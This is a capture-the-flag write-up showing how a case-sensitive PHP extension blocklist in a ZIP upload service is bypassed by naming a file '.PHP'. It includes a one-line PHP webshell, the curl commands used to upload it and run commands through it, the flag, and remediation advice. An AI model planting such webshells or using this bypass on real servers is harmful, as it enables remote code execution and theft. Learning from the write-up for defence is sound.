# Zip-a-Dip-Doo-Dah

**Category:** Crypto / Web
**Flag:** `UMCS{04346b1f-f7f4-433a-b5fb-208bbdda8575}`

## Challenge Overview

> *"Our enterprise ZIP extraction platform automatically analyzes uploaded archives and enforces strict security policies before extraction. Every file is carefully inspected to prevent malicious content from being deployed on our servers."*
>
> **Hint:** `abc != ABC`

## Initial Enumeration / Recon

The application accepts a `.zip` upload, extracts it server-side, and for each entry prints either `Successfully extracted: <link>` or `Blocked file type -> <name>`.

Stack: PHP 8.1.27 on Apache 2.4.62. Extracted files land in `/uploads/<random_hex>/`.

Testing a ZIP containing `test.php`:

```
Blocked file type -> test.php
```

The hint `abc != ABC` is a direct nudge: **the blocklist check is case-sensitive, but Apache's PHP handler is not**.

## Vulnerability Analysis

The server-side check:

```php
$ext = pathinfo($entry, PATHINFO_EXTENSION);
if (in_array($ext, ['php', 'phtml', 'phar', 'phps'], true)) {
    // block
}
```

`pathinfo()` does not normalise case. `in_array(..., true)` is strict. So `.PHP` is not in the blocklist.

Apache's `mod_php` uses case-insensitive extension matching — `.PHP`, `.PhP`, `.pHp` all execute as PHP on most Linux installations.

## Exploitation Steps

```bash
# Create a minimal PHP webshell
echo '<?php system($_GET["c"]); ?>' > shell.PHP

# ZIP it
zip shell.zip shell.PHP

# Upload to the challenge
curl -F "zipfile=@shell.zip" http://<challenge-url>/

# Response:
# Successfully extracted: /uploads/6a904944ad5807a9/shell.PHP
```

```bash
# Read the flag
curl 'http://.../uploads/6a904944ad5807a9/shell.PHP?c=cat+/tmp/flag.txt'
# UMCS{04346b1f-f7f4-433a-b5fb-208bbdda8575}
```

## Flag

```
UMCS{04346b1f-f7f4-433a-b5fb-208bbdda8575}
```

Extension-based upload filters that rely on string comparison without normalising case are a constant source of bypasses. The correct fix is lowercasing the extension before comparison, using an allowlist instead of a blocklist, or disabling PHP execution in the upload directory entirely with `php_admin_flag engine off`.
